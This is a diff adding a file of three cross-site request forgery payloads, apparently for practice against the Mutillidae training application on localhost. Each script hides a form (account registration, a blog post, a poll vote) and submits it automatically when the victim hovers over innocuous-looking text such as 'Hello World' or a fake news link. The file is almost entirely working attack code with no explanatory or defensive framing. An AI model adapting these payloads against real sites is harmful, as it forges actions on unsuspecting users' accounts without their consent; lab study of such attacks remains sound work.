@@ -1,0 +1,64 @@
+﻿Script 1: 
+
+<form id="CSRF" method="POST" action="http://127.0.0.1/mutillidae/index.php?page=register.php">
+	<input name="username" 				value="sammy" type="hidden" />
+	<input name="password" 				value="samurai" type="hidden" />
+	<input name="confirm_password" 			value="samurai" type="hidden" />
+	<input name="my_signature" 				value="The password is samurai" type="hidden" />
+	<input name="register-php-submit-button" 	value="Create+Account" type="hidden" />
+</form>
+<span onmouseover="function sleep(milliseconds) {var start = new Date().getTime();for (var i = 0; i < 1e7; i++) {if ((new Date().getTime() - start) > milliseconds){break;}}}try{var lURL=document.location.href;sleep(2000);document.getElementById(\'CSRF\').submit();sleep(6000);document.location.href=lURL;}catch(e){alert(e.message);}">Hello World</span>
+
+Script 2:
+
+<form id="f" action="http://127.0.0.1/mutillidae/index.php?page=add-to-your-blog.php" method="post" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="csrf-token" value="best-guess"/>
+<input type="hidden" name="blog_entry" value="Add this guy to the Wall of Sheep"/>
+<input type="hidden" name="add-to-your-blog-php-submit-button" value="TESTING"/>
+</form>
+<i onmouseover="window.document.getElementById('f').submit()">Dancing with the stars results</i>
+
+Script 3:
+
+<script>
+function sendcsrf(){
+	var lForm = document.createElement("FORM");
+	lForm.action="http://127.0.0.1/mutillidae/index.php";
+	lForm.method = "GET";
+	lForm.enctype="application/x-www-form-urlencoded";
+	document.body.appendChild(lForm);
+
+	var lPage = document.createElement("INPUT");
+	lPage.setAttribute("name", "page");
+	lPage.setAttribute("type", "hidden");
+	lPage.setAttribute("value", "user-poll.php");
+	lForm.appendChild(lPage);
+
+	var lCSRFToken = document.createElement("INPUT");
+	lCSRFToken.setAttribute("name", "csrf-token");
+	lCSRFToken.setAttribute("type", "hidden");
+	lCSRFToken.setAttribute("value", "");
+	lForm.appendChild(lCSRFToken);
+
+	var lChoice = document.createElement("INPUT");
+	lChoice.setAttribute("name", "choice");
+	lChoice.setAttribute("type", "hidden");
+	lChoice.setAttribute("value", "nmap");
+	lForm.appendChild(lChoice);
+
+	var lInitials = document.createElement("INPUT");
+	lInitials.setAttribute("name", "initials");
+	lInitials.setAttribute("type", "hidden");
+	lInitials.setAttribute("value", "JD");
+	lForm.appendChild(lInitials);
+
+	var lButton = document.createElement("INPUT");
+	lButton.setAttribute("name", "user-poll-php-submit-button");
+	lButton.setAttribute("type", "hidden");
+	lButton.setAttribute("value", "Submit Vote");
+	lForm.appendChild(lButton);
+
+	lForm.submit();
+}
+</script>
+<span onmouseover="sendcsrf();">Vote for nmap. I know you will.</span></td>
